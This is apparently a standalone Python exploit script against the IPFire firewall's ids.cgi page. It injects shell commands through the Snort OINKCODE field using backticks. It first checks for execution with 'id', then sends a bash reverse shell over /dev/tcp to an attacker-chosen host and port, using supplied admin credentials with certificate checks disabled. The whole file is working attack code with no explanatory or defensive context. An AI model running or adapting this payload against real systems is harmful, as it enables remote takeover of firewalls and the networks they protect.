#!/usr/python
import requests,sys

if len(sys.argv) != 6:    
    print("[-] How to use -> python3 127.0.0.1 1337 http://192.0.0.1/cgi-bin/ids.cgi admin admin")
else:
    revhost = sys.argv[1]
    revport = sys.argv[2]
    url = sys.argv[3]
    username = sys.argv[4]
    password = sys.argv[5]


    payload = 'bash -i >& /dev/tcp/' + revhost + '/' + str(revport) + ' 0>&1'
    evildata = {'ENABLE_SNORT_GREEN':'on','ENABLE_SNORT':'on','RULES':'registered','OINKCODE': '`id`','ACTION': 'Download new ruleset','ACTION2':'snort'}
    headers = {'Accept-Encoding' : 'gzip, deflate, br','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','User-Agent':'IPFIRE Exploit','Referer': url,'Upgrade-Insecure-Requests':'1'}


    def verifyVuln():
        req = requests.post(url,data=evildata,headers=headers,auth=(username,password),verify=False) # Verify false is added because most of the time the certificate is self signed.
        if(req.status_code == 200 and "uid=99(nobody)" in req.text):
            print("[+] IPFire Installation is Vulnerable [+]")
            revShell()
        else:
            print("[!] Not Vulnerable [!]")

    def revShell():
        evildata["OINKCODE"] = '`' + payload + '`'
        print("[+] Sending Malicious Payload [+]")
        req = requests.post(url,data=evildata,headers=headers,auth=(username,password),verify=False)

        
    verifyVuln()